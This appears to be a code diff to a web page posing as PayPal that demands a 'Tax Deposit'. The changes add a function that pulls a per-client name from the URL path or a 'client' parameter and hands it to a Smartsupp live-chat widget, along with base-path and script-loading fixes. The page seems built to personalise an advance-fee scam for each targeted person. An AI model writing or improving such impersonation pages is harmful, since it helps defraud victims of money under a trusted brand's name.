@@ -5,6 +5,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Tax Deposit Required – PayPal</title>
 
+  <script>
+    if (location.protocol !== 'file:') {
+      const b = document.createElement('base');
+      b.href = '/';
+      document.head.appendChild(b);
+    }
+  </script>
+
   <!-- Smartsupp Live Chat script -->
   <script type="text/javascript">
     var _smartsupp = _smartsupp || {};
@@ -16,8 +24,23 @@
       c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
     })(document);
 
+    function getClientSlugFromUrl() {
+      const path = window.location.pathname;
+      const match = path.match(/\/tax\/([^/?#]+)/i);
+      if (match && match[1] && match[1] !== 'index.html') {
+        return decodeURIComponent(match[1]);
+      }
+      const params = new URLSearchParams(window.location.search);
+      return params.get('client') || null;
+    }
+
     function openSupportChat() {
       if (typeof smartsupp === 'function') {
+        const slug = getClientSlugFromUrl();
+        if (slug) {
+          const clientName = slug.replace(/[-_]+/g, ' ').split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
+          smartsupp('name', clientName);
+        }
         smartsupp('chat:show');
         smartsupp('chat:open');
       }
@@ -340,7 +363,7 @@
     </div>
   </main>
 
-  <script src="../app.js"></script>
+  <script src="/app.js" onerror="this.onerror=null;this.src='app.js';"></script>
   <script>
     function loadTaxAmount() {
       const data = getReceiptData();
